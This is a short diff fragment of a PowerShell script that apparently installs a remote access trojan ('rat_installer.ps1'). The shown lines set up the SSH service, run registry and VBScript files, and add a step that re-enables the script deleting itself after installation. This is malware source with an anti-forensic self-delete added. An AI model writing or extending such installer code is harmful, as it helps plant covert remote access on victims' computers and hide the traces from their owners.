@@ -62,6 +62,7 @@ Set-Service -Name sshd
 # install the registery
 ./"$reg_file.reg";"$vsb_file.vbs"
 
+pause
 # self delete
-# cd $initial_dir
-# del rat_installer.ps1
+cd $initial_dir
+del rat_installer.ps1
